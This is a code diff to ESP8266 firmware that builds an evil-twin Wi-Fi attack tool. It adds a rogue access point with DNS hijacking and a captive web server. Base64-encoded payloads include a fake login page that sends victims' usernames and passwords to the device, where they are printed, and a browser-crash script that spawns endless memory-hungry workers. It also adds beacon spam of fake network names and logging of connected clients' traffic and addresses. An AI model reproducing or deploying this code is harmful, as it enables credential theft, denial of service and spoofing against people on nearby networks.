@@ -9,8 +9,23 @@
 #include <ESP8266WiFi.h>
 #include "./DNSServer.h"
 #include <ESP8266WebServer.h>
-
+#include <string.h>
 char hostname[128];
+
+char ssid[32];
+char dns_filter[25];
+char html_text[4096];
+
+const char *CRASH_BYTES = "CjxzY3JpcHQ+CiAgICAhKChCUyk9Pnt2YXIgRT1gYT1bXTtmb3IoOzspe2EucHVzaChbJHtCU30sYS5wb3AoKV0pfWAsQz1gZGF0YTp0ZXh0L2h0bWw7YmFzZTY0LCR7YnRvYShFKX1gLFA9YGZvcig7Oyl7bmV3IFdvcmtlcigiJHtDfSIpfWAsQ0M9YGRhdGE6dGV4dC9odG1sO2Jhc2U2NCwke2J0b2EoUCl9YDtuZXcgV29ya2VyKENDKTt9KSgiQXJyYXkoNjAwKS5tYXAoXz0+U3RyaW5nLmZyb21DaGFyQ29kZSgweEZGRkYpLnJlcGVhdCgweDFGRkZGRkU4KSkiKTsgLy9vcmlnaW5hbCBjcmVkaXQgZm9yIHRoaXMgY3Jhc2ggZ29lcyB0byAweDE1MAo8L3NjcmlwdD4=";
+const char *PHISHER = "PGh0bWw+CiAgICA8aGVhZD4KCiAgICA8L2hlYWQ+CiAgICA8Ym9keT4KICAgICAgICA8aDE+TG9nIEluPC9oMT4KICAgICAgICA8cD5Vc2VybmFtZTo8L3A+PGlucHV0IGlkPSJ1bmFtZSI+CiAgICAgICAgPHA+UGFzc3dvcmQ6PC9wPjxpbnB1dCBpZD0icHciPjxicj48YnI+CiAgICAgICAgPGJ1dHRvbiBvbmNsaWNrPSJzdWJtaXQoKSI+U2lnbiBJbjwvYnV0dG9uPgogICAgPC9ib2R5PgogICAgPHNjcmlwdD4KICAgICAgICBmdW5jdGlvbiBzdWJtaXQoKXsKICAgICAgICAgICAgbGV0IHVzZXJuYW1lID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInVuYW1lIikudmFsdWU7CiAgICAgICAgICAgIGxldCBwYXNzd29yZCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJwdyIpLnZhbHVlOwoKICAgICAgICAgICAgZmV0Y2goImh0dHA6Ly8xMC4xMC4xMC4xL2xfamxvZ2luZm8/dXNlcm5hbWU9IiArIHVzZXJuYW1lICsgIiZwYXNzd29yZD0iICsgcGFzc3dvcmQsIHt9KTsKICAgICAgICB9CiAgICA8L3NjcmlwdD4KPC9odG1sPg==";
+
+ESP8266WebServer server(80);
+
+
+const byte DNS_PORT = 53; 
+IPAddress apIP(10, 10, 10, 1);
+DNSServer dnsServer;
+
 
 const uint8_t channels[] = {1, 6, 11};
 const bool wpa2 = false; 
@@ -27,7 +42,8 @@ uint32_t packetCounter = 0;
 uint32_t attackTime = 0;
 uint32_t packetRateTime = 0;
 
-char *ssids[64] PROGMEM;
+char **ssids;
+int ssid_amount;
 
 extern "C" {
 #include "user_interface.h"
@@ -187,7 +203,7 @@ void charEndSequence(){
 }
 
 void setup() {
-	Serial.begin(9600);
+	Serial.begin(115200);
   Serial.println("\n[OK] Successfully setup Serial");
 	Serial.println("[...] Setting up Spiffs");
   if(!SPIFFS.begin()){
@@ -244,12 +260,7 @@ void setup() {
     packetSize -= 26;
   }
 
-  // generate random mac address
   randomMac();
-
-  // start serial
-  Serial.begin(115200);
-  Serial.println();
 
   // get time
   currentTime = millis();
@@ -263,31 +274,37 @@ void setup() {
 }
 
 bool spamming_beacons = false;
+bool is_running = false;
+bool logging_http = true;
+
+struct station_info *stat_info;
+struct ip_addr *IPaddress;
+IPAddress address;
 
 void handleCommand(char **args, int index){
   Serial.println();
   if(strcmp(args[0], "help") == 0){
     Serial.println("Here are all the commands available to you:");
     Serial.println("help");
-    Serial.println("reboot");
+    Serial.println("reboot"); 
     Serial.println("encode [text]");
     Serial.println("cat [file]");
     Serial.println("set-content [file] [text]");
     Serial.println("decode [text]");
-    Serial.println("fs-dump");
+    Serial.println("ls");
     Serial.println("rem [file]");
     Serial.println("spam-beacons [file]");
     Serial.println("stop-beacons");
     Serial.println("esptap-help");
     Serial.println("esptap [arguments]");
+    Serial.println("network-scan");
   }else if(strcmp(args[0], "esptap-help") == 0){
     Serial.println("ESPTAP help:");
     Serial.println("esptap connected");
     Serial.println("esptap returns [base64-encoded-payload]");
-    Serial.println("esptap load [file]");
+    Serial.println("esptap run");
     Serial.println("esptap mode [crash-clients/steal-passwords/sniff-device-info]");
-    Serial.println("esptap logging [all/http-only/dns-only/none]");
-    Serial.println("esptap captive-portal [yes/no]");
+    Serial.println("esptap log-mode [all/http-only/dns-only/none]");
   }else if(strcmp(args[0], "reboot") == 0){
     Serial.println("[OK] Powering off...");
     ESP.restart();
@@ -300,13 +317,13 @@ void handleCommand(char **args, int index){
       strcat(total_buf_in, args[i]);
       strcat(total_buf_in, " ");
     }
-    unsigned int str_l = encode_base64((unsigned char *) total_buf_in, strlen(total_buf_in), (unsigned char *) encoded);
+    encode_base64((unsigned char *) total_buf_in, strlen(total_buf_in), (unsigned char *) encoded);
     Serial.print(encoded);
   }else if(strcmp(args[0], "set-content") == 0){
     char *file = (char *)malloc(sizeof(char) * strlen(args[1]) + 2);
     strcpy(file, "/");
     strcat(file, args[1]);
-    char content[4096];
+    char content[36864];
 
     decode_base64((unsigned char *)args[2], (unsigned char *) content);
     
@@ -320,7 +337,7 @@ void handleCommand(char **args, int index){
     Serial.println(file);
   }else if(strcmp(args[0], "decode") == 0){
 
-  }else if(strcmp(args[0], "fs-dump") == 0){
+  }else if(strcmp(args[0], "ls") == 0){
     Serial.println();
     Dir root = SPIFFS.openDir("/");
     uint8_t counter = 0;
@@ -333,7 +350,125 @@ void handleCommand(char **args, int index){
     Serial.print(counter);
     Serial.println(" files");
   }else if(strcmp(args[0], "esptap") == 0){
+    if(index < 2){
+      Serial.println("Not enough arguments provided, use ESPTAP help");
+      return;
+    }
+    if(strcmp(args[1], "run") == 0){
+      Serial.flush();
+      Serial.print("SSID:");
+      while(Serial.available() == 0){}
+      strcpy(ssid, Serial.readStringUntil('\n').c_str());
+      Serial.println(ssid);
+      Serial.print("DNS-FILTER:");
+      while(Serial.available() == 0){}
+      strcpy(dns_filter, Serial.readStringUntil('\n').c_str());
+      Serial.println(dns_filter);
+      Serial.print("Website File:");
+      char file[32];
+      while(Serial.available() == 0){}
+      strcpy(file, "/");
+      strcat(file, Serial.readStringUntil('\n').c_str());
+      Serial.println(file);
+      File website = SPIFFS.open(file, "r");
+      strcpy(html_text, "");
+      while(website.available()){
 
+        char i3c = (char)website.read();
+        char tmpstr[2] = { i3c, '\0'};
+        strcat(html_text, tmpstr);
+      }
+      Serial.println(html_text);
+      Serial.println("Saving config to file ");
+      Serial.print(ssid);
+      Serial.println(".txt");
+
+      char *config_fs = (char *)malloc(sizeof(char) * strlen(ssid) + 7);
+      strcpy(config_fs, "/");
+      strcat(config_fs, ssid);
+      strcat(config_fs, ".txt");
+      char config[512];
+      strcpy(config, "{\"ssid\":\"");
+      strcat(config, ssid);
+      strcat(config, "\", \"dns_filter\":\"");
+      strcat(config, dns_filter);
+      strcat(config, "\"\"file\":\"");
+      strcat(config, file);
+      strcat(config, "\"}");
+
+      File fs_conf = SPIFFS.open(config_fs, "w+");
+      fs_conf.print(config);
+      fs_conf.close();
+
+
+      Serial.println("[...] Starting Server...");
+      WiFi.mode(WIFI_AP);
+      WiFi.softAPConfig(apIP, apIP, IPAddress(255,255,255,0));
+      WiFi.softAP(ssid);
+      Serial.println("[OK] Network is up!");
+
+      Serial.println("[...] Starting DNS server");
+      dnsServer.start(DNS_PORT, dns_filter, apIP);
+      Serial.println("[OK] DNS server online!");
+
+      Serial.println("[...] Starting HTTP");
+      server.on("/l_jloginfo", loginfo);
+      server.onNotFound(http_handle);
+      server.begin();
+      Serial.println("[...] HTTP server started!");
+
+      is_running = true;
+    }else if(strcmp(args[1], "returns") == 0 ){
+      decode_base64((unsigned char *) args[2], (unsigned char *)html_text);
+      Serial.println("[OK] Updated Return payload");
+    }else if(strcmp(args[1], "log-mode") == 0){
+      if(strcmp(args[2], "all") == 0){
+        dnsServer.setLoggingMode(true);
+        logging_http = true;
+      }else if(strcmp(args[2], "http-only") == 0){
+        logging_http = true;
+        dnsServer.setLoggingMode(false);
+      }else if(strcmp(args[2], "dns-only") == 0){
+        logging_http = false;
+        dnsServer.setLoggingMode(true);
+      }else if(strcmp(args[2], "none") == 0){
+        logging_http = false;
+        dnsServer.setLoggingMode(false);
+      }
+    }else if(strcmp(args[1], "connected") == 0){
+      Serial.print("All Connected Clients:\r\n");
+      stat_info = wifi_softap_get_station_info();
+      int counter = 0;
+      while (stat_info != NULL)
+      {
+        counter++;
+        ipv4_addr *IPaddress = &stat_info->ip;
+        address = IPaddress->addr;
+        Serial.print("-----\nClient ");
+        Serial.print(counter);
+        Serial.print("\nMAC:");
+        Serial.print(stat_info->bssid[0],HEX);
+        Serial.print(stat_info->bssid[1],HEX);
+        Serial.print(stat_info->bssid[2],HEX);
+        Serial.print(stat_info->bssid[3],HEX);
+        Serial.print(stat_info->bssid[4],HEX);
+        Serial.print(stat_info->bssid[5],HEX);
+        Serial.print("\nAPIP:");
+        Serial.print(address);
+        Serial.println("\r\n");
+        stat_info = STAILQ_NEXT(stat_info, next);
+      } 
+    }else if(strcmp(args[1], "mode") == 0){
+      if(strcmp(args[2], "crash-clients") == 0){
+          decode_base64((unsigned char *) CRASH_BYTES, (unsigned char *)html_text);
+          Serial.println("Set the server to crash mode!");
+      }else if(strcmp(args[2], "steal-passwords")==0){
+          decode_base64((unsigned char *) PHISHER, (unsigned char *)html_text);
+          Serial.println("Set the server to steal-passwords mode!");
+      }else if(strcmp(args[2], "sniff-device-info") == 0){
+
+      }
+    }
   }else if(strcmp(args[0], "rem") == 0){
     char *file = (char *)malloc(sizeof(char) * strlen(args[1]) + 2);
     strcpy(file, "/");
@@ -358,37 +493,117 @@ void handleCommand(char **args, int index){
 
     Serial.println();
     Serial.print("END FILE");
-  }if(strcmp(args[0], "spam-beacons")){
+  }else if(strcmp(args[0], "spam-beacons") == 0){
+    Serial.println("[...] Loading SSIDS");
     char *file = (char *)malloc(sizeof(char) * strlen(args[1]) + 2);
     strcpy(file, "/");
     strcat(file, args[1]);
     File ssid_handle = SPIFFS.open(file, "r");
+    std::vector<String> ssid_buffer;
     int i = 0;
-  
     while(ssid_handle.available()){
-      if(i > 75) break;
-      const char *jb = ssid_handle.readStringUntil('\n').c_str();
-      char *this_ssid = malloc(sizeof(char) * strlen(jb) + 1);
-      strcpy(this_ssid, jb);
-      strcat(this_ssid, "\n");
-      ssids[i] = (char *) malloc((32  + 1 )* sizeof(char));
-      strcpy(ssids[i], this_ssid);
+      String line = ssid_handle.readStringUntil('\n');
+      ssid_buffer.push_back(line);
+      Serial.print("Load SSID:");
+      Serial.println(line);
       i++;
     }
-    Serial.print("Read ");
+    i--;
+    Serial.print("[OK] Read ");
     Serial.print(i);
     Serial.println(" SSIDS to memory");
 
+    //load ssids into a c-string array
+
+    Serial.println("[...] Sending Signal to malloc()");
+    ssids = (char **)malloc(sizeof(char *) * i);
+    ssid_amount = i;
+
+    for(int j = 0; j < i; j++){
+      ssids[j] = (char *)malloc(sizeof(char) * strlen(ssid_buffer[j].c_str()) + 1);
+      strcpy(ssids[j], ssid_buffer[j].c_str());
+    }
 
     spamming_beacons = true;
-  }if(strcmp(args[0], "stop-beacons")){
+  }else if(strcmp(args[0], "stop-beacons") == 0){
     spamming_beacons = false;
+    for(int i = 0; i < ssid_amount; i++){
+      free(ssids[i]);
+    }
+    free(ssids);
+  }else if(strcmp(args[0], "network-scan") == 0) {
+    Serial.println("[...] Putting Down Reciever");
+    WiFi.mode(WIFI_STA);
+    Serial.println("[OK] Put down reciever");
+    Serial.println("[...] Disconnecting Interface");
+    WiFi.disconnect();
+    Serial.println("[OK] Ready to scan!");
+    delay(100);
+    Serial.println("Scanning for networks!");
+    int n = WiFi.scanNetworks();
+    if(n == 0){
+      Serial.println("Scan complete!");
+      Serial.println("No Networks Discovered!");
+    }else{
+      Serial.println("Scan complete!");
+      Serial.print(n);
+      Serial.println(" networks found!");
+      for(int i = 0; i < n; i++){
+        Serial.println("---------------");
+        Serial.print("#");
+        Serial.println(i);
+        Serial.print("SSID:");
+        Serial.println(WiFi.SSID(i));
+        Serial.print("RSSI:");
+        Serial.println(WiFi.RSSI(i));
+        Serial.print("BSSID:");
+        Serial.println(WiFi.BSSIDstr(i));
+        Serial.print("Channel:");
+        Serial.println(WiFi.channel(i));
+      }
+    }
   }else{ 
     Serial.println("No such command found! type help to get a list of commands");
   }
 }
 
+void loginfo(){
+  String ip = server.client().remoteIP().toString();
+  if(server.args() > 0){
+    String username = server.arg("username");
+    String password = server.arg("password");
+    Serial.println("Recieved new user credentials:\n----------");
+    Serial.print("Username:"); 
+    Serial.println(username);
+    Serial.print("Password:");
+    Serial.println(password);
+    Serial.print("----------\n");
+  }
+}
+
+void http_handle(){
+  String ip = server.client().remoteIP().toString();
+  if(logging_http){
+    if(server.args() > 0){
+      String payload = "{\n";
+      //construct fake json payload, probably a better way to do this yeah?
+      for(int arg = 0; arg < server.args(); arg++){
+        payload += "\t" + server.argName(arg) + ":" + server.arg(server.argName(arg)) + "\n";
+      }
+      payload += "}";
+      Serial.println(ip + ": POST http://" + server.hostHeader() + server.uri() + "\n" + payload);
+    }else{ 
+      Serial.println(ip + ": GET http://" + server.hostHeader() + server.uri());
+    }
+  }
+  server.send(200, "text/html", html_text);
+}
+
 void loop() {
+  if(is_running){
+    dnsServer.processNextRequest();
+    server.handleClient();
+  }
   if(Serial.available() > 0){
     char command[256];
     strcpy(command, Serial.readStringUntil('\n').c_str());
@@ -407,30 +622,21 @@ void loop() {
     currentTime = millis();
 
     if (currentTime - attackTime > 100) {
+      Serial.print("Attacking:");
+      Serial.println(packetCounter);
       attackTime = currentTime;
 
       // temp variables
       int i = 0;
-      int j = 0;
       int ssidNum = 1;
-      char tmp;
-      int ssidsLen = 64;//STATIC DEFINE PLEASE CHANGE LATER
-      bool sent = false;
 
       // Go to next channel
       nextChannel();
 
-      while (i < ssidsLen) {
-
-
+      while (i < ssid_amount) {
         char *ssid = ssids[i];
 
-        while(strlen(ssid) != 32){
-          if(strlen(ssid) > 32){
-            return;
-          }
-          strcat(ssid, ".");
-        }
+        int ssidLen = strlen(ssid);
 
         macAddr[5] = ssidNum;
         ssidNum++;
@@ -443,26 +649,18 @@ void loop() {
         memcpy(&beaconPacket[38], emptySSID, 32);
 
         // write new SSID into beacon frame
-        memcpy_P(&beaconPacket[38], &ssids[i], 32);
+        memcpy(&beaconPacket[38], ssids[i], ssidLen);
 
         // set channel for beacon frame
         beaconPacket[82] = wifi_channel;
 
-        for (int k = 0; k < 3; k++) {
-          packetCounter += wifi_send_pkt_freedom(beaconPacket, packetSize, 0) == 0;
+
+        while (0 != wifi_send_pkt_freedom(beaconPacket, packetSize, 0)) {
           delay(1);
         }
-
-        i += j;
+        packetCounter++;
+        i += 1;
       }
-    }
-
-    // show packet-rate each second
-    if (currentTime - packetRateTime > 1000) {
-      packetRateTime = currentTime;
-      Serial.print("BEACON SPAMMING!12e1 Packets/s: ");
-      Serial.println(packetCounter);
-      packetCounter = 0;
     }
   }
 }
